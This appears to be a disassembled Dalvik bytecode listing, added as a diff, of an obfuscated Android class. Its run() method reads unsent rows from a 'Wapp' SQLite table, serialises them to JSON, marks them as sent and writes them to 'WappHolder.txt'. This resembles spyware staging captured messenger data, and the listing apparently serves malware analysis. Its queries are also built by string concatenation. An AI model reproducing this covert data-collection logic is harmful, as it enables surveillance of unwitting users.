@@ -1,0 +1,221 @@
+# Lcom/mixio/tosh/aprl/aetn/ate$a;->run()V [access_flags=public]
+#
+# Parameters:
+# local registers: v0...v12
+#
+# - return:void
+
+run-BB@0x0 : [ run-BB@0x12 ]
+	0       (00000000) const-string         v0, "'"
+	1       (00000004) const-string         v1, 'Data'
+	2       (00000008) const-string         v2, 'md5id'
+	3       (0000000c) const/4              v3, 1
+	4       (0000000e) sput-boolean         v3, Lcom/mixio/tosh/aprl/aetn/ate;->q Z
+
+run-BB@0x12 : [ run-BB@0x4c run-BB@0xd8 ]
+	5       (00000012) iget-object          v4, v12, Lcom/mixio/tosh/aprl/aetn/ate$a;->a Ljava/util/List;
+	6       (00000016) invoke-interface     v4, Ljava/util/List;->clear()V
+	7       (0000001c) new-instance         v4, Lorg/json/JSONArray;
+	8       (00000020) invoke-direct        v4, Lorg/json/JSONArray;-><init>()V
+	9       (00000026) sget-object          v5, Lcom/mixio/tosh/aprl/aetn/ate;->g Lb/b/a/a/f/a;
+	10      (0000002a) iget-object          v5, v5, Lb/b/a/a/f/a;->d Landroid/database/sqlite/SQLiteDatabase;
+	11      (0000002e) const-string         v6, "select * from Wapp where Sent='No'"
+	12      (00000032) const/4              v7, 0
+	13      (00000034) invoke-virtual       v5, v6, v7, Landroid/database/sqlite/SQLiteDatabase;->rawQuery(Ljava/lang/String; [Ljava/lang/String;)Landroid/database/Cursor;
+	14      (0000003a) move-result-object   v5
+	15      (0000003c) invoke-interface     v5, Landroid/database/Cursor;->moveToFirst()Z
+	16      (00000042) move-result          v6
+	17      (00000044) const-string         v8, 'Wapp'
+	18      (00000048) if-eqz               v6, +48
+	12:43
+	(Ljava/lang/Exception; -> 234 run-BB@0x234)
+
+run-BB@0x4c : [ run-BB@0xcc ]
+	19      (0000004c) new-instance         v6, Lorg/json/JSONArray;
+	20      (00000050) invoke-direct        v6, Lorg/json/JSONArray;-><init>()V
+	21      (00000056) new-instance         v9, Lorg/json/JSONObject;
+	22      (0000005a) invoke-direct        v9, Lorg/json/JSONObject;-><init>()V
+	23      (00000060) new-instance         v10, Lorg/json/JSONObject;
+	24      (00000064) invoke-direct        v10, Lorg/json/JSONObject;-><init>()V
+	25      (0000006a) invoke-interface     v5, v2, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I
+	26      (00000070) move-result          v11
+	27      (00000072) invoke-interface     v5, v11, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
+	28      (00000078) move-result-object   v11
+	29      (0000007a) invoke-virtual       v10, v2, v11, Lorg/json/JSONObject;->put(Ljava/lang/String; Ljava/lang/Object;)Lorg/json/JSONObject;
+	30      (00000080) invoke-interface     v5, v1, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I
+	31      (00000086) move-result          v11
+	32      (00000088) invoke-interface     v5, v11, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
+	33      (0000008e) move-result-object   v11
+	34      (00000090) invoke-virtual       v10, v1, v11, Lorg/json/JSONObject;->put(Ljava/lang/String; Ljava/lang/Object;)Lorg/json/JSONObject;
+	35      (00000096) invoke-virtual       v6, v10, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
+	36      (0000009c) invoke-virtual       v9, v8, v6, Lorg/json/JSONObject;->put(Ljava/lang/String; Ljava/lang/Object;)Lorg/json/JSONObject;
+	37      (000000a2) invoke-virtual       v4, v9, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
+	38      (000000a8) iget-object          v6, v12, Lcom/mixio/tosh/aprl/aetn/ate$a;->a Ljava/util/List;
+	39      (000000ac) invoke-interface     v5, v2, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I
+	40      (000000b2) move-result          v9
+	41      (000000b4) invoke-interface     v5, v9, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
+	42      (000000ba) move-result-object   v9
+	43      (000000bc) invoke-interface     v6, v9, Ljava/util/List;->add(Ljava/lang/Object;)Z
+	44      (000000c2) goto                 +5
+	4c:c1
+	(Lorg/json/JSONException; -> c4 run-BB@0xc4)
+	(Ljava/lang/Exception; -> 234 run-BB@0x234)
+
+run-BB@0xc4 : [ run-BB@0xc6 ]
+	45      (000000c4) move-exception       v6
+
+run-BB@0xc6 : [ run-BB@0xcc ]
+	46      (000000c6) invoke-virtual       v6, Lorg/json/JSONException;->printStackTrace()V
+	c6:fb
+	(Ljava/lang/Exception; -> 234 run-BB@0x234)
+
+run-BB@0xcc : [ run-BB@0xd8 run-BB@0x4c ]
+	47      (000000cc) invoke-interface     v5, Landroid/database/Cursor;->moveToNext()Z
+	48      (000000d2) move-result          v6
+	49      (000000d4) if-nez               v6, -44
+	c6:fb
+	(Ljava/lang/Exception; -> 234 run-BB@0x234)
+
+run-BB@0xd8 : [ run-BB@0xe4 ]
+	50      (000000d8) iget-object          v1, v12, Lcom/mixio/tosh/aprl/aetn/ate$a;->a Ljava/util/List;
+	51      (000000dc) invoke-interface     v1, Ljava/util/List;->iterator()Ljava/util/Iterator;
+	52      (000000e2) move-result-object   v1
+	c6:fb
+	(Ljava/lang/Exception; -> 234 run-BB@0x234)
+
+run-BB@0xe4 : [ run-BB@0xf0 run-BB@0x19a ]
+	53      (000000e4) invoke-interface     v1, Ljava/util/Iterator;->hasNext()Z
+	54      (000000ea) move-result          v2
+	55      (000000ec) if-eqz               v2, +57
+	c6:fb
+	(Ljava/lang/Exception; -> 234 run-BB@0x234)
+
+run-BB@0xf0 : [ run-BB@0xfc ]
+	56      (000000f0) invoke-interface     v1, Ljava/util/Iterator;->next()Ljava/lang/Object;
+	57      (000000f6) move-result-object   v2
+	58      (000000f8) check-cast           v2, Ljava/lang/String;
+	c6:fb
+	(Ljava/lang/Exception; -> 234 run-BB@0x234)
+
+run-BB@0xfc : [ run-BB@0x140 run-BB@0xe4 ]
+	59      (000000fc) sget-object          v5, Lcom/mixio/tosh/aprl/aetn/ate;->g Lb/b/a/a/f/a;
+	60      (00000100) iget-object          v5, v5, Lb/b/a/a/f/a;->d Landroid/database/sqlite/SQLiteDatabase;
+	61      (00000104) new-instance         v6, Ljava/lang/StringBuilder;
+	62      (00000108) invoke-direct        v6, Ljava/lang/StringBuilder;-><init>()V
+	63      (0000010e) const-string         v9, "select * from Wapp where md5id='"
+	64      (00000112) invoke-virtual       v6, v9, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	65      (00000118) invoke-virtual       v6, v2, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	66      (0000011e) invoke-virtual       v6, v0, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	67      (00000124) invoke-virtual       v6, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+	68      (0000012a) move-result-object   v6
+	69      (0000012c) invoke-virtual       v5, v6, v7, Landroid/database/sqlite/SQLiteDatabase;->rawQuery(Ljava/lang/String; [Ljava/lang/String;)Landroid/database/Cursor;
+	70      (00000132) move-result-object   v5
+	71      (00000134) invoke-interface     v5, Landroid/database/Cursor;->getCount()I
+	72      (0000013a) move-result          v5
+	73      (0000013c) if-lez               v5, -2c
+	fc:18d
+	(Ljava/lang/Exception; -> 190 run-BB@0x190)
+
+run-BB@0x140 : [ run-BB@0xe4 ]
+	74      (00000140) new-instance         v5, Landroid/content/ContentValues;
+	75      (00000144) invoke-direct        v5, Landroid/content/ContentValues;-><init>()V
+	76      (0000014a) const-string         v6, 'Sent'
+	77      (0000014e) const-string         v9, 'Yes'
+	78      (00000152) invoke-virtual       v5, v6, v9, Landroid/content/ContentValues;->put(Ljava/lang/String; Ljava/lang/String;)V
+	79      (00000158) sget-object          v6, Lcom/mixio/tosh/aprl/aetn/ate;->g Lb/b/a/a/f/a;
+	80      (0000015c) iget-object          v6, v6, Lb/b/a/a/f/a;->d Landroid/database/sqlite/SQLiteDatabase;
+	81      (00000160) new-instance         v9, Ljava/lang/StringBuilder;
+	82      (00000164) invoke-direct        v9, Ljava/lang/StringBuilder;-><init>()V
+	83      (0000016a) const-string         v10, "md5id='"
+	84      (0000016e) invoke-virtual       v9, v10, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	85      (00000174) invoke-virtual       v9, v2, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	86      (0000017a) invoke-virtual       v9, v0, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	87      (00000180) invoke-virtual       v9, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+	88      (00000186) move-result-object   v2
+	89      (00000188) invoke-virtual       v6, v8, v5, v2, v7, Landroid/database/sqlite/SQLiteDatabase;->update(Ljava/lang/String; Landroid/content/ContentValues; Ljava/lang/String; [Ljava/lang/String;)I
+	90      (0000018e) goto                 -55
+
+run-BB@0x190 : [ run-BB@0x192 ]
+	91      (00000190) move-exception       v2
+
+run-BB@0x192 : [ run-BB@0xe4 ]
+	92      (00000192) invoke-virtual       v2, Ljava/lang/Exception;->getMessage()Ljava/lang/String;
+	93      (00000198) goto                 -5a
+	192:1ab
+	(Ljava/lang/Exception; -> 234 run-BB@0x234)
+
+run-BB@0x19a : [ run-BB@0x1a6 run-BB@0x23c ]
+	94      (0000019a) invoke-virtual       v4, Lorg/json/JSONArray;->length()I
+	95      (000001a0) move-result          v0
+	96      (000001a2) if-lez               v0, +4d
+	192:1ab
+	(Ljava/lang/Exception; -> 234 run-BB@0x234)
+
+run-BB@0x1a6 : [ run-BB@0x1ac ]
+	97      (000001a6) invoke-virtual       v4, Lorg/json/JSONArray;->toString()Ljava/lang/String;
+	192:1ab
+	(Ljava/lang/Exception; -> 234 run-BB@0x234)
+
+run-BB@0x1ac : [ run-BB@0x1c8 ]
+	98      (000001ac) new-instance         v0, Ljava/io/File;
+	99      (000001b0) sget-object          v1, Lcom/mixio/tosh/aprl/aetn/ate;->c Ljava/io/File;
+	100     (000001b4) const-string         v2, 'WappHolder.txt'
+	101     (000001b8) invoke-direct        v0, v1, v2, Ljava/io/File;-><init>(Ljava/io/File; Ljava/lang/String;)V
+	102     (000001be) new-instance         v1, Ljava/io/FileOutputStream;
+	103     (000001c2) invoke-direct        v1, v0, v3, Ljava/io/FileOutputStream;-><init>(Ljava/io/File; Z)V
+	1ac:1c7
+	(Ljava/lang/Exception; -> 21e run-BB@0x21e)
+
+run-BB@0x1c8 : [ run-BB@0x228 ]
+	104     (000001c8) new-instance         v0, Ljava/lang/StringBuilder;
+	105     (000001cc) invoke-direct        v0, Ljava/lang/StringBuilder;-><init>()V
+	106     (000001d2) invoke-virtual       v4, Lorg/json/JSONArray;->toString()Ljava/lang/String;
+	107     (000001d8) move-result-object   v2
+	108     (000001da) invoke-virtual       v0, v2, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	109     (000001e0) const/16             v2, 10
+	110     (000001e4) invoke-virtual       v0, v2, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;
+	111     (000001ea) invoke-virtual       v0, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+	112     (000001f0) move-result-object   v0
+	113     (000001f2) invoke-static        v0, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;
+	114     (000001f8) move-result-object   v0
+	115     (000001fa) invoke-virtual       v0, Ljava/lang/String;->getBytes()[B
+	116     (00000200) move-result-object   v0
+	117     (00000202) invoke-virtual       v1, v0, Ljava/io/FileOutputStream;->write([B)V
+	118     (00000208) new-instance         v0, Lorg/json/JSONArray;
+	119     (0000020c) invoke-direct        v0, Lorg/json/JSONArray;-><init>()V
+	120     (00000212) invoke-virtual       v1, Ljava/io/FileOutputStream;->close()V
+	121     (00000218) goto                 +8
+	1c8:217
+	(Ljava/lang/Exception; -> 21a run-BB@0x21a)
+
+run-BB@0x21a : [ run-BB@0x222 ]
+	122     (0000021a) move-exception       v0
+	123     (0000021c) goto                 +3
+
+run-BB@0x21e : [ run-BB@0x222 ]
+	124     (0000021e) move-exception       v0
+	125     (00000220) move-object          v1, v7
+
+run-BB@0x222 : [ run-BB@0x228 ]
+	126     (00000222) invoke-virtual       v0, Ljava/lang/Exception;->getMessage()Ljava/lang/String;
+	222:227
+	(Ljava/lang/Exception; -> 234 run-BB@0x234)
+
+run-BB@0x228 : [ run-BB@0x22c run-BB@0x23c ]
+	127     (00000228) if-eqz               v1, +a
+
+run-BB@0x22c : [ run-BB@0x23c ]
+	128     (0000022c) invoke-virtual       v1, Ljava/io/FileOutputStream;->close()V
+	129     (00000232) goto                 +5
+	22c:231
+	(Ljava/lang/Exception; -> 23c run-BB@0x23c)
+
+run-BB@0x234 : [ run-BB@0x23c ]
+	130     (00000234) move-exception       v0
+	131     (00000236) invoke-virtual       v0, Ljava/lang/Exception;->getMessage()Ljava/lang/String;
+
+run-BB@0x23c : 
+	132     (0000023c) const/4              v0, 0
+	133     (0000023e) sput-boolean         v0, Lcom/mixio/tosh/aprl/aetn/ate;->q Z
+	134     (00000242) return-void          
+
